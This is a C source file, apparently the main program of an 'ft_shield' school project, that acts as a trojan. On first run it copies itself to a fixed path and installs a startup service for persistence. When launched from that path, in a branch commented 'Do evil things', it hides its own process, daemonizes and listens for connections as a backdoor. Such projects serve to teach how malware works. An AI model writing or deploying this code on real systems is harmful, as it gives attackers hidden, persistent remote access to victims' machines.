#include "../includes/ft_shield.h"

// Check PATH where it is executed
// ANSWER: readlink to retrive full path of the executable
// https://stackoverflow.com/questions/933850/how-do-i-find-the-location-of-the-executable-in-c
int main ( void )
{
    char buf[1024];
    // check where is it executed
    int i = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    buf[i] = '\0';
    if (strcmp(buf, EXECUTABLE_FILE)) {
        printf("robrodri & jalvarad.\n");
        copy_payload(buf);
        // systems without systemctl will not work
        startup_setup();
    }
    else { // Do evil things
        hide_pid();
        t_daemon *daemon = create_daemon();
        server_listen(daemon);
        free(daemon);
    }
    return (EXIT_SUCCESS);
}

// https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/